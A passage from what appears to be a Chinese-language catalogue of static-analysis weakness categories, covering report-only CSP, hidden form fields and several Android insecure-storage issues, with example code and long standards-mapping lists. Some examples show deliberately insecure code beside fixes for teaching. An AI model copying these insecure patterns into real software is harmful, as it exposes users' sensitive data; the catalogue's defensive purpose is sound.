<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II </p>
<p>[38] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[39] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="HTML5-Unenforced-Content-Security-Policy"><a href="#HTML5-Unenforced-Content-Security-Policy" class="headerlink" title="HTML5: Unenforced Content Security Policy"></a>HTML5: Unenforced Content Security Policy</h4><h5 id="ABSTRACT-104"><a href="#ABSTRACT-104" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>内容安全策略 (CSP) 在监控模式下完成配置，因而浏览器不会强制实施。</p>
<h5 id="EXPLANATION-105"><a href="#EXPLANATION-105" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>内容安全策略 (CSP) 是声明性安全标头，允许开发人员规定站点可从哪些域中加载内容，或呈现在 Web 浏览器中时向哪些域发起连接。它提供额外的安全层以避免重大漏洞，如 Cross-Site Scripting、Clickjacking、Cross-origin Access 等，此外还有输入验证以及代码中的白名单。 </p>
<p>Content-Security-Policy-Report-Only 标头可以让 Web 应用程序作者和管理员监控而不是强制实施安全策略。此标头通常用于试验和/或开发站点安全策略。假若策略有效，则可以转而使用 Content-Security-Policy 标头字段强制实施该策略。</p>
<p>示例 1：以下代码在 Report-Only 模式下设置内容安全策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;content-security-policy report-only=&quot;true&quot; policy-directives=&quot;default-src https://content.cdn.example.com&quot; /&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/http&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-105"><a href="#RECOMMENDATIONS-105" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>配置并强制实施内容安全策略以缓解注入漏洞。</p>
<p>示例 2：以下代码在受 Spring Security 保护的应用程序中设置内容安全策略：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;content-security-policy policy-directives=&quot;default-src https://content.cdn.example.com&quot; /&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/http&gt;</span><br></pre></td></tr></table></figure>
<p>内容安全策略并不用于解决所有内容注入漏洞，而是利用 CSP 来减少由内容注入攻击造成的损害。应定期执行防范编码实践，例如输入验证和输出编码。</p>
<h5 id="REFERENCES-103"><a href="#REFERENCES-103" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP Content Security Policy </p>
<p>[2] W3C Content Security Policy 1.1 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001368, CCI-001414 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[9] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6 </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.6 </p>
<p>[14] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000480 CAT II, APSC-DV-000490 CAT II </p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="Hidden-Field"><a href="#Hidden-Field" class="headerlink" title="Hidden Field"></a>Hidden Field</h4><h5 id="ABSTRACT-105"><a href="#ABSTRACT-105" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序创建了一个隐藏的表单字段。</p>
<h5 id="EXPLANATION-106"><a href="#EXPLANATION-106" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>程序员通常信任隐藏字段的内容，认为用户不会查看它们或操作其内容。攻击者则会推翻这些假设。他们将检查写入隐藏字段的值，更改它们，或使用攻击数据替换这些内容。</p>
<p>示例：</p>
<p>  <code>Hidden hidden = new Hidden(element);</code></p>
<p>如果隐藏字段包含敏感信息，那么就会像捕捉该页面的其余部分一样捕捉这些信息。这会导致敏感信息在用户不知情的情况下在浏览器缓存中被隐藏起来。</p>
<h5 id="RECOMMENDATIONS-106"><a href="#RECOMMENDATIONS-106" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>注意攻击者将研究应用程序中使用的所有隐藏字段并对其进行解码。将隐藏字段视为不可信赖的输入。如果信息不能和页面其余部分一起缓存，不要在隐藏字段中存储这些信息。</p>
<h5 id="REFERENCES-104"><a href="#REFERENCES-104" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Input Validation and Representation Micro Focus Fortify</p>
<p>[2] IDS14-J. Do not trust the contents of hidden form fields CERT</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 472, CWE ID 642</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M4 Unintended Data Leakage</p>
<p>[5] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 642</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3610 CAT I</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3610 CAT I</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3610 CAT I</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3610 CAT I</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3610 CAT I</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3610 CAT I</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3610 CAT I</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002485 CAT I</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002485 CAT I</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002485 CAT I</p>
<p>[16] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[17] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Insecure-Storage-Android-Backup-Storage"><a href="#Insecure-Storage-Android-Backup-Storage" class="headerlink" title="Insecure Storage: Android Backup Storage"></a>Insecure Storage: Android Backup Storage</h4><h5 id="ABSTRACT-106"><a href="#ABSTRACT-106" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该程序利用 Android 的备份服务将永久性应用程序数据保存到一个远程云存储中。</p>
<h5 id="EXPLANATION-107"><a href="#EXPLANATION-107" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Android 的备份服务可以使应用程序将永久性数据保存到一个远程云存储上，以便以后为应用程序数据提供一个恢复点。</p>
<p>通过将 allowBackup 属性设置为 true（默认值）并在 <code>&lt;application&gt;</code> 标签上定义 backupAgent 属性，可以为 Android 应用程序配置该备份服务。</p>
<p>但是，由于不同设备的云存储和传输方式不同，Android 并不保证您的数据在使用备份功能时的安全性。</p>
<h5 id="RECOMMENDATIONS-107"><a href="#RECOMMENDATIONS-107" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果您的应用程序包含敏感信息，请慎重使用备份功能存储敏感信息。此外，请谨记，由于 allowBackup 属性的默认值为 true，因此有必要明确将此属性设置为 false 以禁用备份。</p>
<h5 id="REFERENCES-105"><a href="#REFERENCES-105" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] JavaDoc for Android Android</p>
<p>[2] Android Developers API Guide: Data Backup Android</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 359</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Insecure-Storage-Android-External-Storage"><a href="#Insecure-Storage-Android-External-Storage" class="headerlink" title="Insecure Storage: Android External Storage"></a>Insecure Storage: Android External Storage</h4><h5 id="ABSTRACT-107"><a href="#ABSTRACT-107" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序将数据写入 Android 设备的外部存储。</p>
<h5 id="EXPLANATION-108"><a href="#EXPLANATION-108" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>保存到外部存储上的文件可随意读取，并且能够被启用 USB 海量存储来传输计算机上的文件的用户修改。另外，即便卸载了将文件写入外部存储卡的应用程序，这些文件也不会被删除。这些缺陷会危及写入存储的敏感信息，或者使攻击者能够通过修改程序所依赖的外部文件将恶意数据注入程序。</p>
<p>例 1：在以下代码中，Environment.getExternalStorageDirectory() 返回对 Android 设备外部存储的引用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">private void WriteToFile(String what_to_write) &#123;</span><br><span class="line"></span><br><span class="line">       try&#123;</span><br><span class="line"></span><br><span class="line">           File root = Environment.getExternalStorageDirectory();</span><br><span class="line"></span><br><span class="line">           if(root.canWrite()) &#123;</span><br><span class="line"></span><br><span class="line">               File dir = new File(root + &quot;write_to_the_SDcard&quot;);</span><br><span class="line"></span><br><span class="line">               File datafile = new File(dir, number + &quot;.extension&quot;);</span><br><span class="line"></span><br><span class="line">               FileWriter datawriter = new FileWriter(datafile);</span><br><span class="line"></span><br><span class="line">               BufferedWriter out = new BufferedWriter(datawriter);</span><br><span class="line"></span><br><span class="line">               out.write(what_to_write);</span><br><span class="line"></span><br><span class="line">               out.close();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-108"><a href="#RECOMMENDATIONS-108" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>写入应用程序特定的位置，例如应用程序的 SQLite 数据库。Android 完全支持 SQLite 数据库。应用程序内的任意类都可以按名称访问您所创建的任意数据库，应用程序外的类则无法访问。 例 2：通过创建 SQLiteOpenHelper 的子类和替代 OnCreate() 方法来创建一个新的 SQLite 数据库。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">    public class MyDbOpenHelper extends SQLiteOpenHelper &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    private static final int DATABASE_VERSION = 2;</span><br><span class="line"></span><br><span class="line">    private static final String DICTIONARY_TABLE_NAME = &quot;dictionary&quot;;</span><br><span class="line"></span><br><span class="line">    private static final String DICTIONARY_TABLE_CREATE =</span><br><span class="line"></span><br><span class="line">                &quot;CREATE TABLE &quot; + DICTIONARY_TABLE_NAME + &quot; (&quot; +</span><br><span class="line"></span><br><span class="line">                KEY_WORD + &quot; TEXT, &quot; +</span><br><span class="line"></span><br><span class="line">                KEY_DEFINITION + &quot; TEXT);&quot;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    DictionaryOpenHelper(Context context) &#123;</span><br><span class="line"></span><br><span class="line">        super(context, DATABASE_NAME, null, DATABASE_VERSION);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line"></span><br><span class="line">    public void onCreate(SQLiteDatabase db) &#123;</span><br><span class="line"></span><br><span class="line">        db.execSQL(DICTIONARY_TABLE_CREATE);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 3：或者，写入设备的内部存储。默认情况下，保存到内部存储的文件是 Android 应用程序专用的。其他 应用程序和用户均无法访问它们。用户卸载该应用程序时，这些文件将随之删除。 在下列代码中，我们创建了一个专用文件并将其写入内部存储。我们声明了 Context.MODE_PRIVATE。 MODE_PRIVATE 会创建一个文件（或替换同名文件），并使其成为您应用程序的专用文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String FILENAME = &quot;hello_file&quot;;</span><br><span class="line"></span><br><span class="line">String string = &quot;hello world!&quot;;</span><br><span class="line"></span><br><span class="line">FileOutputStream fos = openFileOutput(FILENAME, Context.MODE_PRIVATE);</span><br><span class="line"></span><br><span class="line">fos.write(string.getBytes());</span><br><span class="line"></span><br><span class="line">fos.close();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-106"><a href="#REFERENCES-106" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Data Storage</p>
<p>[2] Paul McNamara Latest ‘lost’ laptop holds treasure-trove of unencrypted ATT payroll data Network World</p>
<p>[3] Standards Mapping - FIPS200 MP</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[6] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.3</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.3</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.3</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II</p>
<p>[13] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Insecure-Storage-Android-World-Readable-or-Writeable"><a href="#Insecure-Storage-Android-World-Readable-or-Writeable" class="headerlink" title="Insecure Storage: Android World Readable or Writeable"></a>Insecure Storage: Android World Readable or Writeable</h4><h5 id="ABSTRACT-108"><a href="#ABSTRACT-108" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序使数据可供 Android 设备上的所有应用程序访问。</p>
<h5 id="EXPLANATION-109"><a href="#EXPLANATION-109" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用 MODE_WORLD_READBLE 或 MODE_WORLD_WRITEABLE 存储在 Android 内部存储中的数据可供设备上的所有应用程序访问。这不仅无法防止数据损坏，而且如果是敏感信息的话，可能违反用户隐私和安全事宜。</p>
<h5 id="RECOMMENDATIONS-109"><a href="#RECOMMENDATIONS-109" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不要使用可读或可写工具将敏感数据保存在 Android 内部存储中。同时，不建议用此模式进行跨进程通信。而应考虑使用 ContentProvider 根据具体情况来设定和赋予权限。</p>
<h5 id="REFERENCES-107"><a href="#REFERENCES-107" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Designing for Security Android</p>
<p>[2] S. Fahl, M. Harbach, T. Muders, M. Smith, L. Baumgartner, B. Friesleben Why Eve and Mallory Love Android:An Analysis of Android SSL (In)Security</p>
<p>[3] OWASP Top 10 Mobile Risks OWASP</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 359</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Insecure-Storage-HTTP-Response-Cache-Leak"><a href="#Insecure-Storage-HTTP-Response-Cache-Leak" class="headerlink" title="Insecure Storage: HTTP Response Cache Leak"></a>Insecure Storage: HTTP Response Cache Leak</h4><h5 id="ABSTRACT-109"><a href="#ABSTRACT-109" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>所述方法将 HTTP(S) 响应缓存安装在不安全的共享存储中。</p>
<h5 id="EXPLANATION-110"><a href="#EXPLANATION-110" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>HTTP(S) 响应中可能包含敏感数据，例如会话 Cookie 和 API 标记。 出于性能方面的考虑，URL 加载系统会对所有 HTTP(S) 响应进行缓存，将它们以未加密的形式存储在不安全的共享存储中。</p>
<p>示例 1： 以下代码将 HTTP(S) 响应缓存安装在共享存储空间：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line"></span><br><span class="line">        File httpCacheDir = new File(context.getExternalCacheDir(), &quot;http&quot;);</span><br><span class="line"></span><br><span class="line">        long httpCacheSize = 10 * 1024 * 1024; // 10 MiB</span><br><span class="line"></span><br><span class="line">        HttpResponseCache.install(httpCacheDir, httpCacheSize);</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">        Log.i(TAG, &quot;HTTP response cache installation failed:&quot; + e);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> protected void onStop() &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    HttpResponseCache cache = HttpResponseCache.getInstalled();</span><br><span class="line"></span><br><span class="line">    if (cache != null) &#123;</span><br><span class="line"></span><br><span class="line">        cache.flush();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
